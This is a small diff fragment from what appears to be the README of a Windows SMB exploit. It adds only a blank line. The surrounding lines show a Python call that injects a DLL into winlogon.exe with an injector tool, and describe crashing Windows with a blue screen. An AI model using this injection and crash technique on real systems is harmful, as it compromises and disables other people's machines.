@@ -141,6 +141,7 @@ def exploit():
    subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))
 
 And when the SMB decompressed the header, it will crash the windows system at the beginning by bule screen of death as below.
+
 ![blue screen of death](https://user-images.githubusercontent.com/59459399/111933682-545c6180-8a96-11eb-8095-cea3bfcd5999.png)
 
 
